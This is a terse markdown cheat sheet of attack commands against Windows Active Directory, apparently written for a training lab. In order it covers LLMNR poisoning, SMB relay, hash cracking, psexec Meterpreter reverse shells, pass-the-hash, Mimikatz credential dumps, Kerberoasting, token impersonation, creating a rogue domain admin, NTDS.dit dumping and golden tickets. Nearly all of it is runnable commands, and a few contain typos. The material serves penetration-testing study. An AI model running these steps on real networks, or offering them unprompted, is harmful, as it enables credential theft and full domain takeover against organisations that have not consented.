# 1-SCANNING

ip a
sudo netdiscover -r <subnet>/24
sudo nmap -sV -oA initial_scan_quick <subnet>/<ip-range>

# 2-CAPTURING HASHES

sudo nano /etc/responder/Responder.conf
sudo responder -I eth0 -dvPv
Hashes saved: `/usr/share/responder/logs/`
Save hash in to hashes.txt

# 3-CRACkING HASHES / SMB Relay

## CRACkING HASHES:

hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

## SMB Relay:

### Identily hosts without smb signing 

nmap --script=smb2-security-mode.nse -p445 <subnet>/24 -Pn

sudo nano /etc/responder/Responder.conf

save tasgets into targets.txt

```bash
# Terminal 1 - Capture
$ sudo responder -I eth0 -dvPv

# Terminal 2 - Relay
$ impacket-ntlmrelayx -tf targets.txt -smb2support -i
$ impacket-ntlmrelayx -tf targets.txt -smb2support 

# Terminal 3 - Connect
$ nc 127.0.0.1 11000
```
shares
use C$

# 4-GAINING SHELL ACCESS

```bash
$ msfconsole
> search psexec
> use exploit/windows/smb/psexec
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> set LHOST <your-ip>
> set LPORT <port>
```

## Password Attack
```bash
> set SMBDOMAIN <domain>
> set SMBUSER <user>
> set SMBPASS <password>
> set RHOSTS <target-ip>
> exploit
```

## Hash Attack (Pass-the-Hash)
```bash
> set SMBUSER administrator
> unset SMBDOMAIN
> set SMBPASS <ntlm-hash>
> set RHOSTS <target-ip>
> exploit
```

### Manual PSExec (Python)

```bash
# With password
$ impacket-psexec <domain>/<user>:<password>@<target-ip>

# With hash
$ impacket-psexec -hashes :<hash> <domain>/<user>@<target-ip>
```

net user /domain

exit shell

# 5-DOMAIN ENUMERATION

bloodhound-python -u <user> -p <password> -d <domain> -ns <dc-ip> -c all

# 6-PASS ATTACKS

## pass the pass 

crackmapexec smb <subnet>/24 -u <user> -d <domain> -p <password>
crackmapexec smb <subnet>/24 -u <user> -d <domain> -p <password> --sam
crackmapexec smb <subnet>/24 -u <user> -d <domain> -p <password> --shares

## pass the hash

crackmapexec smb <subnet>/24 -u administrator -H <hash> --local-auth
crackmapexec smb <subnet>/24 -u administrator -H <hash> --local-auth --sam

### get the database data

cmedb
hosts
creds

# DUMPING & CRACKING HASHES

impacket-secretsdump <domain>/<user>:<password>@<target-ip>

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```
# MIMKATZ

```bash
$ msfconsole
> search psexec
> use exploit/windows/smb/psexec
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> set LHOST <your-ip>
> set LPORT <port>
> set SMBDOMAIN <domain>
> set SMBUSER <user>
> set SMBPASS <password>
> set RHOSTS <target-ip>
> exploit
```
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\\Windows\\Temp\\mimikatz.exe
shell
cd C:\Windows\Temp
mimikatz.exe

privilege::debug
sekurlsa::logonpasswords

# KERBEROASTING

echo "<dc-ip> <dc-hostname>.<domain> <domain>" | sudo tee -a /etc/hosts

impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <dc-ip> -request -outputfile krb.txt

hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt

# TOKEN IMPERSONATION

```bash
$ msfconsole
> search psexec
> use exploit/windows/smb/psexec
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> set LHOST <your-ip>
> set LPORT <port>
> set SMBDOMAIN <domain>
> set SMBUSER <user>
> set SMBPASS <password>
> set RHOSTS <target-ip>
> exploit
```

load incognito
list_tokens -u

impersonate_token <domain>\\<user>
shell
whoami
rev2self

## ADD USER

net user /add hacker Password /domain
net goup "Domain Admins" hacker /ADD /DOMAIN

### Prove it

impacket-secretsdump <domain>/hacker:'Password'@<dc-ip>

# DUMPING NTDS.dit

impacket-secretsdump <domain>/hacker:Password@<dc-ip> -just-dc-ntlm
save hasehs in to ntds.txt
hashcat -m"1000" ntds.txt /usr/share/wordlists/rockyou.txt

# GOLDEN TICKET

```bash
$ msfconsole
> search psexec
> use exploit/windows/smb/psexec
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> set LHOST <your-ip>
> set LPORT <port>
> set SMBDOMAIN <domain>
> set SMBUSER <loacal-admin>
> set SMBPASS <password>
> set RHOSTS <target-ip>
> exploit
```

upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\\Windows\\Temp\\mimikatz.exe
shell
cd C:\Windows\Temp
mimikatz.exe

privilege::debug
lsadump::lsa /inject /name:krbtgt
COPY DOMAIN SID
COPY NTLM HASH

kerberos::golden /User:FakeUser /domain:MARVEL.local /sid:<SID> /krbtgt:<HASH> /id:500 /ptt
misc::cmd
